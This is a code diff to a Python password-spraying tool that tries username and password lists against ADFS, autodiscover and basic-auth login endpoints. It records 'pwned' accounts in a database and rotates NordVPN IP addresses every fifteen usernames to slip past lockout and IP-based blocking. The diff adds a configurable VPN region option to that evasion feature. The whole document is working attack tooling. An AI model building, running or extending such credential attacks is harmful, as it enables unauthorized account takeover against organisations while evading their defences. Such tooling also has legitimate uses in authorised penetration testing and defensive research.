@@ -59,6 +59,7 @@ def args_parse():
     parser.add_argument("--vpn", action=argparse.BooleanOptionalAction, help="Use nord vpn to rotate IP")
     parser.add_argument('--skip-tested', action='store_true', help="Skip user:password already tried and logged in the DB")
     parser.add_argument('--ignore-success', action='store_true', help="Skip user already pwned in the DB")
+    parser.add_argument("--vpn-area", default="Europe", help="VPN Zone(s) to use (ex: --vpn-area France,Germany,Netherlands,United Kingdom). Défaut: Europe.")
     return parser.parse_args()
 
 
@@ -168,7 +169,7 @@ def autodiscover_attempts(users, passes, targets, sleep_time, random, min_sleep,
         excptn(e)
 
 
-def adfs_attempts(users, passes, targets, sleep_time, random, min_sleep, max_sleep, vpn, initial_ip, skip_tested, ignore_success):
+def adfs_attempts(users, passes, targets, sleep_time, random, min_sleep, max_sleep, vpn, area, initial_ip, skip_tested, ignore_success):
     working_creds_counter = 0  # zeroing the counter of working creds before starting to count
     username_counter = 0
     prev_ip = initial_ip
@@ -199,7 +200,7 @@ def adfs_attempts(users, passes, targets, sleep_time, random, min_sleep, max_sle
                             continue  # passe au suivant
 
                     if vpn and username_counter % 15 == 0:
-                        new_ip = safe_rotate_vpn(prev_ip=prev_ip, rotate_retries=4)
+                        new_ip = safe_rotate_vpn(area, prev_ip=prev_ip, rotate_retries=4)
                         if new_ip:
                             prev_ip = new_ip
                             LOGGER.debug(f"[VPN] Using IP {prev_ip}")
@@ -262,7 +263,6 @@ def main():
     global LOGGER
     LOGGER = configure_logger(args.verbose, "ADFS")
     init_db("events.db")
-    vpn = args.vpn
 
     if args.userlist:
         try:
@@ -308,9 +308,13 @@ def main():
     LOGGER.info("Total number of targets to test: %s" % str(total_passwords))
     LOGGER.info("Total number of attempts: %s" % str(total_attempts))
 
-    if vpn:
+    initial_ip = get_public_ip(timeout=5, retries=2)
+    area = args.vpn_area or "Europe"
+
+    if args.vpn:
         try:
-            initialize_VPN(save=1, area_input=['France,Germany,Netherlands,United Kingdom'])
+            initialize_VPN(save=1, area_input=[area])
+            LOGGER.debug(f"[VPN] initialized VPN on: {area} region(s)")
         except Exception as e:
             LOGGER.warning(f"[VPN] initialize_VPN failed at start: {e}")
 
@@ -335,7 +339,7 @@ def main():
     elif args.method == 'adfs':
         LOGGER.info("[*] You chose %s method" % args.method)
         adfs_attempts(usernames_stripped, passwords_stripped, targets_stripped,
-                      args.sleep, random, min_sleep, max_sleep, vpn, initial_ip, args.skip_tested, args.ignore_success)
+                      args.sleep, random, min_sleep, max_sleep, args.vpn, area, initial_ip, args.skip_tested, args.ignore_success)
 
     elif args.method == 'basicauth':
         LOGGER.info("[*] You chose %s method" % args.method)
@@ -345,7 +349,7 @@ def main():
     else:
         LOGGER.critical("[!] Please choose a method (autodiscover or adfs)")
     
-    if vpn:
+    if args.vpn:
         terminate_VPN()
 
 if __name__ == "__main__":
